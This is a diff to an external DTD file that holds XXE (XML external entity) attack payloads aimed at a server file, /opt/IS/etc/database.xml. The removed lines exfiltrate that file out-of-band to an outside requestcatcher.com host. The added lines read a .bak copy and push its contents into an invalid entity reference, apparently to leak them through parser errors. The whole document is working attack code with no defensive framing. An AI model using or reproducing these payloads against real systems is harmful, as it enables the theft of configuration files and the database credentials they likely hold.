@@ -1,6 +1,4 @@
-<!ENTITY % start '<![CDATA['>
-<!ENTITY % file SYSTEM 'file:///opt/IS/etc/database.xml'>
-<!ENTITY % end ']]>'>
-<!ENTITY % poke '<!ENTITY &#37; send SYSTEM "http://dmlbn.requestcatcher.com/leaf?c=%start;%file;%end;">'>
-%poke;
-%send;
+<!ENTITY % cfga SYSTEM "file:///opt/IS/etc/database.xml.bak">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
